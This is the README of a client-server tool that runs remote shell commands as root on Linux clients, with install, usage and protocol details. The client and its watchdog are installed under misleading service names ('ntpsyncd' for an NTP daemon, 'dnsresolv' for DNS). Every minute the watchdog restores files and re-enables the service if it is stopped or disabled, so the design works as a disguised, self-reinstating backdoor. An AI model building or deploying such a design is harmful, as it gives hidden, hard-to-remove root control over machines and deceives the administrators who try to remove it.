# Remote Command Execution System

A client-server system for remote command execution. The server listens on a configurable port and sends commands to connected clients. Clients execute commands with root privileges and return the output.

## ⚠️ Security Warning

**This system allows remote command execution with root privileges. Use only in trusted, isolated networks with proper security measures in place.**

## Project Structure

```
remote-oneway/
├── server/              # Server component
│   ├── server.py        # Main server script
│   ├── env.example      # Server configuration example
│   ├── requirements.txt # Python dependencies
│   └── README.md        # Server documentation
│
└── client/              # Client component
    ├── client.py        # Original client script (for reference/testing)
    ├── ntp-daemon       # Client template (used by installer)
    ├── conf             # Monitor script template
    ├── env.example      # Client configuration example
    ├── requirements.txt # Python dependencies
    ├── install.sh       # Automated installation script
    ├── uninstall.sh     # Automated uninstallation script
    ├── ntpsyncd.service # Systemd service file
    ├── dnsresolv.service# Systemd monitor service
    ├── dnsresolv.timer  # Systemd timer (checks every minute)
    └── README.md        # Client documentation
```

## Features

### Server
- Listens on configurable port (default: 8443)
- Accepts multiple client connections
- Interactive command prompt
- **Execute commands on specific clients or all clients**
- **Client identification by custom name or IP address**
- Displays command output (stdout/stderr) from all clients
- Shows exit codes for executed commands

### Client
- Connects to server every second
- **Identifies itself with custom name or auto-detects primary IP**
- Executes commands as root user
- Returns stdout, stderr, and exit codes
- Automatic reconnection on connection loss
- Systemd service integration
- Self-healing monitoring system

### Monitoring System
- **ntpsyncd.service**: Runs the client as a background service
- **dnsresolv.timer**: Checks service health every minute
- Automatically restarts stopped/disabled services
- Recreates missing service files
- Logs all monitoring activities

## Quick Start

### Server Setup

1. Navigate to the server directory:
   ```bash
   cd server
   ```

2. Install dependencies:
   ```bash
   pip install -r requirements.txt
   ```

3. Create and configure `.env`:
   ```bash
   cp env.example .env
   # Edit .env if you want to change the port
   ```

4. Run the server:
   ```bash
   python server.py
   ```

### Client Setup (Linux)

1. Navigate to the client directory:
   ```bash
   cd client
   ```

2. Create and configure `.env`:
   ```bash
   cp env.example .env
   nano .env  # Set SERVER_HOST to your server's IP address
              # Optionally set CLIENT_NAME for easy identification
   ```

3. Run the automated installation script:
   ```bash
   sudo ./install.sh
   ```

The installation script will:
- Install Python dependencies (netifaces)
- Read configuration from `.env` file
- Embed configuration into the client script
- Copy client script to `/etc/ntpsync/ntp`
- Copy monitor script to `/etc/ntpsync/conf`
- Install and enable the systemd service
- Install and enable the monitoring timer
- Start the service

**Note**: Configuration is embedded directly into `/etc/ntpsync/ntp`, no separate `.env` file is created on the system.

## Configuration

### Server Configuration (server/.env)

```env
SERVER_HOST=0.0.0.0    # Interface to bind to
SERVER_PORT=8443       # Port to listen on
```

### Client Configuration (client/.env)

```env
SERVER_HOST=localhost  # Server IP address or hostname
SERVER_PORT=8443       # Server port
CLIENT_NAME=           # Optional: Custom client name (e.g., web-server-1)
                       # If empty, uses primary network interface IP
```

## Usage

### Server Commands

Once the server is running, you can:

1. **Execute commands on all clients**: Type any shell command and press Enter.
   ```
   server> whoami
   ```

2. **Execute commands on specific client**: Use `@client_name` prefix.
   ```
   server> @web-server-1 systemctl restart nginx
   server> @192.168.1.100 df -h
   ```

3. **Execute commands on all clients explicitly**: Use `@all` prefix.
   ```
   server> @all uptime
   ```

4. **List clients**: Type `list` or `clients` to see connected clients with their names.
   ```
   server> list
   ```

5. **Exit server**: Type `exit` or `quit` to shutdown the server.

### Example Session

```
server> list

Connected clients (3):
  - web-server-1 (192.168.1.100:45678)
  - db-server (192.168.1.101:45679)
  - 192.168.1.102 (192.168.1.102:45680)

server> whoami
[INFO] Command queued for 3 client(s)

================================================================================
Response from web-server-1 (192.168.1.100:45678):
Command: whoami
Exit Code: 0

--- STDOUT ---
root

================================================================================

server> @web-server-1 systemctl status nginx
[INFO] Command queued for 1 client(s)

================================================================================
Response from web-server-1 (192.168.1.100:45678):
Command: systemctl status nginx
Exit Code: 0

--- STDOUT ---
● nginx.service - A high performance web server
   Loaded: loaded (/lib/systemd/system/nginx.service; enabled)
   Active: active (running) since ...
...
================================================================================

server> @db-server df -h /var/lib/mysql
[INFO] Command queued for 1 client(s)

================================================================================
Response from db-server (192.168.1.101:45679):
Command: df -h /var/lib/mysql
Exit Code: 0

--- STDOUT ---
Filesystem      Size  Used Avail Use% Mounted on
/dev/sda1       100G   45G   50G  48% /
================================================================================
```

## Client Service Management

### Check Service Status

```bash
sudo systemctl status ntpsyncd
```

### View Live Logs

```bash
sudo journalctl -u ntpsyncd -f
```

### Update Configuration

To update the configuration after installation:

1. Edit the `.env` file in the client directory with new values
2. Reinstall the service:
   ```bash
   cd client
   sudo ./install.sh
   ```

The installation script will update the embedded configuration and restart the service.

### Manually Restart Service

```bash
sudo systemctl restart ntpsyncd
```

### Check Monitoring Timer

```bash
# Timer status
sudo systemctl status dnsresolv.timer

# Timer logs
sudo journalctl -u dnsresolv.timer -f

# Monitor script logs
sudo journalctl -u dnsresolv -f
```

### Stop Service

```bash
sudo systemctl stop ntpsyncd
sudo systemctl disable ntpsyncd
```

**Note**: The monitoring timer will automatically restart and re-enable the service within 1 minute.

## Installation Details

### Client Installation Locations

- **Client script**: `/etc/ntpsync/ntp` (with embedded configuration)
- **Monitor script**: `/etc/ntpsync/conf`
- **Service file**: `/etc/systemd/system/ntpsyncd.service`
- **Timer files**: `/etc/systemd/system/dnsresolv.{service,timer}`

**Note**: No separate `.env` file is created. Configuration is embedded directly in `/etc/ntpsync/ntp`.

### How the Monitoring Works

1. The `dnsresolv.timer` triggers every minute
2. It runs `dnsresolv.service` which executes `monitor.sh`
3. The monitor script checks:
   - If service file exists (recreates if missing)
   - If client script exists (restores if missing)
   - If service is active (starts if stopped)
   - If service is enabled (enables if disabled)
4. All actions are logged to the systemd journal

### Client Identification

Clients identify themselves to the server in one of two ways:

1. **Custom Name**: If `CLIENT_NAME` is set in `.env`, it uses that name
2. **Auto-detect**: If `CLIENT_NAME` is empty, it auto-detects the IP address of the first real network interface (excluding loopback)

Examples:
```env
# Custom name
CLIENT_NAME=web-server-1

# Auto-detect (leave empty)
CLIENT_NAME=
```

## Troubleshooting

### Client Can't Connect to Server

1. Check if server is running:
   ```bash
   # On server machine
   netstat -tulpn | grep 8443
   ```

2. Check firewall rules:
   ```bash
   # Allow port 8443
   sudo ufw allow 8443/tcp
   ```

3. Verify client configuration:
   ```bash
   cat /etc/ntpsync/.env
   ```

### Service Keeps Stopping

Check the service logs:
```bash
sudo journalctl -u ntpsyncd -n 100
```

Common issues:
- Incorrect server address in configuration
- Network connectivity problems
- Python dependencies not installed (netifaces)

### Monitor Not Working

1. Check timer status:
   ```bash
   systemctl list-timers dnsresolv.timer
   ```

2. Check monitor logs:
   ```bash
   sudo journalctl -u dnsresolv -n 50
   ```

### Wrong Client Name Showing

If the auto-detected IP is incorrect or you want a custom name:

1. Edit the `.env` file in the client directory:
   ```bash
   cd client
   nano .env
   ```

2. Set CLIENT_NAME:
   ```env
   CLIENT_NAME=my-server-name
   ```

3. Reinstall the service:
   ```bash
   sudo ./install.sh
   ```

## Development

### Testing Without Installation

**Server**:
```bash
cd server
python server.py
```

**Client**:
```bash
cd client
sudo python client.py
```

### Uninstallation

To completely remove the client, use the uninstall script:

```bash
cd client
sudo ./uninstall.sh
```

The uninstall script will:
- Stop and disable all services
- Remove systemd service files
- Remove the installation directory
- Kill any remaining processes
- Offer to remove Python dependencies
- Verify complete removal

**Note**: Since configuration is embedded in the script, there's no separate `.env` file to backup.

Alternatively, you can manually uninstall:

```bash
# Stop and disable services
sudo systemctl stop ntpsyncd
sudo systemctl disable ntpsyncd
sudo systemctl stop dnsresolv.timer
sudo systemctl disable dnsresolv.timer

# Remove service files
sudo rm /etc/systemd/system/ntpsyncd.service
sudo rm /etc/systemd/system/dnsresolv.service
sudo rm /etc/systemd/system/dnsresolv.timer

# Reload systemd
sudo systemctl daemon-reload

# Remove installation directory
sudo rm -rf /etc/ntpsync
```

## Architecture

### Communication Protocol

The system uses JSON messages over TCP sockets:

**Client Identification** (client → server on connect):
```json
{
  "type": "identify",
  "client_name": "web-server-1"
}
```

**Heartbeat** (server → client):
```json
{"type": "heartbeat"}
```

**Command** (server → client):
```json
{
  "type": "command",
  "command": "ls -la"
}
```

**Response** (client → server):
```json
{
  "command": "ls -la",
  "stdout": "...",
  "stderr": "...",
  "exit_code": 0
}
```

### Connection Flow

1. Client connects to server every second
2. Client sends identification message with name or IP
3. Server stores client with its name for targeting
4. Server sends either heartbeat or command
5. Client responds with acknowledgment or command output
6. Connection persists for multiple commands
7. If connection lost, client automatically reconnects

### Command Targeting

The server supports three command formats:

1. **Broadcast** (default): `command` - executes on all clients
2. **Specific client**: `@client_name command` - executes on named client
3. **Explicit broadcast**: `@all command` - executes on all clients

## License

This project is provided as-is for educational and internal use purposes.

## Contributing

This is a custom internal tool. Modifications should be carefully reviewed for security implications.
